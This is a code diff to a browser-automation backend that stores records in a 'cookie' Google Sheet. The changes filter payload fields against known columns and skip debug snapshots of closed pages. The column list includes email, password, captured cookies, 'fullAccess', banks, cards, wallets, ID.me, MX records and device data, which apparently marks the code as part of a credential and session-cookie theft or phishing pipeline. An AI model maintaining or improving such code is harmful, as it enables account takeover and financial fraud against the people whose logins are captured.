@@ -14,6 +14,28 @@ export const fetchDataFromAppScript = _sharedFetchData;
 export const startAppScriptDataBackgroundUpdater = _sharedStartUpdater;
 export const stopAppScriptDataBackgroundUpdater = _sharedStopUpdater;
 
+// Known cookie-sheet columns, used to filter sheet-update payloads so a field the sheet
+// doesn't have (e.g. a top-level 'platform') never breaks the App Script fallback — GAS
+// setMultipleCellDataByColumnSearch would otherwise throw "Header not found" and the whole
+// update would fail exactly when quota forces the fallback path. Refreshed opportunistically
+// from any successful cookie-sheet fetch; the DEFAULT list keeps cold-start/quota writes safe.
+let knownCookieColumns = null;
+const DEFAULT_COOKIE_COLUMNS = new Set([
+    'browserId', 'status', 'email', 'password', 'lastRun', 'lastJsonResponse',
+    'cookieJSON', 'formattedCookie', 'cookieFileURL', 'driveUrl', 'platform',
+    'verified', 'fullAccess', 'server', 'timestamp', 'lastUserActivity',
+    'projectId', 'userId', 'formId', 'strictly', 'domain', 'ipData', 'deviceData',
+    'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider'
+]);
+export function setKnownCookieColumns(headers) {
+    if (Array.isArray(headers) && headers.length > 0) {
+        knownCookieColumns = new Set(headers);
+    }
+}
+export function getKnownCookieColumns() {
+    return knownCookieColumns || DEFAULT_COOKIE_COLUMNS;
+}
+
 // Set of browserIds the engine is actively processing (typing, navigating, checking)
 export const activelyProcessing = new Set();
 
@@ -242,11 +264,19 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
     }
   }
 
+  // Only forward keys that are real cookie-sheet columns. Unknown fields (e.g. a top-level
+  // 'platform') are dropped so the App Script fallback never fails on a missing header.
+  const knownCols = getKnownCookieColumns();
+  const filteredUpdate = {};
+  for (const [key, value] of Object.entries(cleanUpdateObject)) {
+    if (knownCols.has(key)) filteredUpdate[key] = value;
+  }
+
   const sheetsApiUpdateMap = {
     browserId: browserId,
     lastRun: lastRunTimestamp,
-    lastJsonResponse: cleanUpdateObject.lastJsonResponse || defaultLastJsonResponse,
-    ...cleanUpdateObject
+    lastJsonResponse: filteredUpdate.lastJsonResponse || defaultLastJsonResponse,
+    ...filteredUpdate
   };
 
   if (updateObject.cookieJSON) {
@@ -280,6 +310,7 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
     try {
       const existingData = await getSheetDataApi("cookie");
       if (existingData.success && Array.isArray(existingData.data)) {
+        setKnownCookieColumns(existingData.headers);
         const statusIdx = existingData.headers.indexOf('status');
         const browserIdIdx = existingData.headers.indexOf('browserId');
         if (statusIdx !== -1 && browserIdIdx !== -1) {
@@ -333,8 +364,8 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
       browserId: browserId,
       key: process.env.SCRIPT_KEY,
       lastRun: lastRunTimestamp,
-      lastJsonResponse: cleanUpdateObject.lastJsonResponse || defaultLastJsonResponse,
-      ...cleanUpdateObject
+      lastJsonResponse: filteredUpdate.lastJsonResponse || defaultLastJsonResponse,
+      ...filteredUpdate
     });
 
     if (isNewRow) {
@@ -673,6 +704,10 @@ export const setCorsHeaders = (response) => {
 
 export async function saveDebugSnapshot(page, browserId, endpoint, reason) {
   try {
+    // Page/browser may already be closed during cleanup — nothing to snapshot, skip silently.
+    if (!page || typeof page.isClosed !== 'function' || page.isClosed()) {
+      return;
+    }
     const htmlContent = await page.content();
     const timestamp = new Date().toISOString();
     const params = new URLSearchParams();
@@ -699,6 +734,11 @@ export async function saveDebugSnapshot(page, browserId, endpoint, reason) {
       logger.error(`[saveDebugSnapshot][${browserId}] App Script error: ${response.data?.error || 'unknown'}`);
     }
   } catch (error) {
+    // A page closing mid-snapshot is expected during teardown — not worth an ERROR log.
+    if (/Target closed|detached Frame|Protocol error/i.test(error?.message || '')) {
+      logger.debug(`[saveDebugSnapshot][${browserId}] Skipped (page closing): ${error.message}`);
+      return;
+    }
     logger.error(`[saveDebugSnapshot][${browserId}] Error: ${error.message}`);
   }
 }
